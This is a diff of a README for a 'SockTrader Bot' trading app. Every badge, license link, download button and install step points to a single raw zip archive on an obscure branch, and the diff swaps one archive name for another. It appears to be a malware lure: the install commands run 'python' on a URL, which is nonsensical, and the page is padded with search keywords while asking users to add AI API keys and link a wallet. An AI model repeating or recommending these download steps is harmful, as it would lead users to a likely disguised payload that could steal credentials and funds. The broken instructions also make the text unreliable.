@@ -1,9 +1,9 @@
 # 🧦 SockTrader Bot: The Algorithmic Sock Exchange Wizard  
 
-[![Build Status](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip)](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip)
-[![License: MIT](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip)](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip)
-![Downloads](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip)
-![Release](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip)
+[![Build Status](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip)](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip)
+[![License: MIT](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip)](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip)
+![Downloads](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip)
+![Release](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip)
 
 ---
 
@@ -11,8 +11,8 @@ Welcome to the SockTrader Bot repository — your digital atelier for algorithmi
 
 Jump in and level up with seamless installations and snazzy integrations. Want to see some quick magic? Hit the “Download” button and let the sock trading adventure begin:
 
-<a href="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip">
-  <img src="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip%20Here-success?style=for-the-badge&logo=cloud-download&logoColor=white" alt="Download SockTrader Bot" />
+<a href="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip">
+  <img src="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip%20Here-success?style=for-the-badge&logo=cloud-download&logoColor=white" alt="Download SockTrader Bot" />
 </a>
 
 ---
@@ -53,7 +53,7 @@ SockTrader Bot is not just a bot—it’s your best bet for **algorithmic sock t
 - "best automated collectibles trading app"
 - "OpenAI Claude API integration for traders"
 
-https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip look no further. SockTrader Bot brings together powerful automation, data-driven algorithms, and intuitive design—from the ground up.
+https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip look no further. SockTrader Bot brings together powerful automation, data-driven algorithms, and intuitive design—from the ground up.
 
 ---
 
@@ -87,19 +87,19 @@ Rain, snow, eclipse, or global sock shortage—help is always ready.
 
 ## 🏁 Quick Installation & Setup
 
-1. Download the latest **SockTrader Bot** release **(https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip)**.
+1. Download the latest **SockTrader Bot** release **(https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip)**.
 2. Alternatively, tap the ever-glamorous download button below:
    
-   <a href="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip">
-     <img src="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip%20Here-success?style=for-the-badge&logo=cloud-download&logoColor=white" alt="Download SockTrader Bot" />
+   <a href="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip">
+     <img src="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip%20Here-success?style=for-the-badge&logo=cloud-download&logoColor=white" alt="Download SockTrader Bot" />
    </a>
 
 3. Extract the archive onto your lubed-up machine or cozy server.
 4. Open a terminal and run:  
-   `python https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip`
+   `python https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip`
 5. Launch the bot:  
-   `python https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip`
-6. Configure your AI API keys: simply modify `https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip` and set `OPENAI_KEY` and `CLAUDE_KEY`.
+   `python https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip`
+6. Configure your AI API keys: simply modify `https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip` and set `OPENAI_KEY` and `CLAUDE_KEY`.
 7. Strut through the onboarding wizards—choose your language, link your wallet, and kick off your first sock trade!
 
 ---
@@ -113,7 +113,7 @@ All trading activities, sock-related or otherwise, carry risk—never bet your l
 
 ## 📜 MIT License
 
-This software glides under the [MIT License, 2025](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip)—so remix, tweak, or expand, as long as you keep the tag on!
+This software glides under the [MIT License, 2025](https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip)—so remix, tweak, or expand, as long as you keep the tag on!
 
 ---
 
@@ -122,8 +122,8 @@ This software glides under the [MIT License, 2025](https://github.com/ricardomar
 Ready to take the leap from drawer to digital shelf? 
 Grab the latest release below and set your sock trading journey to autopilot:
 
-<a href="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip">
-  <img src="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/bot_socktrader_exchange_proxy_2.8.zip%20Here-success?style=for-the-badge&logo=cloud-download&logoColor=white" alt="Download SockTrader Bot" />
+<a href="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip">
+  <img src="https://github.com/ricardomarco/socktrader-bot-proxy-exchange/raw/refs/heads/branch/presphenoid/proxy_socktrader_exchange_bot_2.2.zip%20Here-success?style=for-the-badge&logo=cloud-download&logoColor=white" alt="Download SockTrader Bot" />
 </a>
 
 _SockTrader Bot — weaving code and collector’s passion, one algorithmic sock at a time._
